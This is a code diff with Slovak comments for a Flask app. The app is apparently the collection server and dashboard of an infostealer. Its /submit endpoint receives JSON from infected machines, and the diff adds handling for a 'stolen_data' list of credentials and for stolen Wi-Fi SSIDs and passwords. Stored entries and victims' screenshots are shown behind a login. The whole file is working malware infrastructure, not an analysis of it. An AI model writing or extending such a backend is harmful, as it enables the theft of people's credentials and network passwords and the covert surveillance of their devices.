@@ -8,7 +8,6 @@ import base64
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "supertajnykluc123")
-
 DATA_FILE = "data.json"
 
 def load_data():
@@ -29,17 +28,37 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
+# --- Upravený endpoint na prijímanie dát ---
 @app.route('/submit', methods=['POST'])
 def submit_data():
     data = request.json
     if not data:
         return jsonify({"error": "No JSON data received"}), 400
+
+    # Pridáme čas prijatia
+    data['received_at'] = datetime.utcnow().isoformat() + "Z"
+
+    # --- SPRACOVANIE NOVÝCH DÁT ---
+    # Táto časť zabezpečí, že údaje sú v štruktúre, ktorú vie dashboard zobraziť.
     
-    # Pridáme čas prijatia (ak už nie je)
-    if not data.get('received_at'):
-        data['received_at'] = datetime.utcnow().isoformat() + "Z"
-    
-    # Uložíme dáta
+    # 1. Skontrolujeme, či existuje nové pole 'stolen_data'
+    if 'stolen_data' in data and isinstance(data['stolen_data'], list):
+        # Ak áno, predpokladáme, že je to nový formát skriptu.
+        # Dáta už sú v správnom formáte, nemusíme nič meniť.
+        pass # Nič nerobiť, 'data' je už v poriadku.
+    else:
+        # Ak pole 'stolen_data' neexistuje, je to buď starý formát,
+        # alebo sa nepodarilo získať žiadne poverenia.
+        # Pre konzistenciu vytvoríme prázdne pole, aby sa nerozbil dashboard.
+        data['stolen_data'] = []
+
+    # 2. Zabezpečíme, aby existovali aj nové WiFi polia, aj keď sú prázdne
+    if 'wifi_ssid' not in data:
+        data['wifi_ssid'] = None
+    if 'wifi_password' not in data:
+        data['wifi_password'] = None
+
+    # Uložíme spracované dáta
     current_data = load_data()
     current_data.append(data)
     save_data(current_data)
@@ -82,7 +101,6 @@ def detail(index):
     entry = data[index]
     return render_template('dashboard_alt.html', entry=entry, index=index)
 
-# Optional: stiahnuť screenshot ako súbor (ak existuje)
 @app.route('/screenshot/<int:index>')
 @login_required
 def screenshot(index):
@@ -99,5 +117,3 @@ def screenshot(index):
 if __name__ == '__main__':
     # Na produkciu nastav debug=False a použij gunicorn
     app.run(host='0.0.0.0', port=5000, debug=True)
-
-
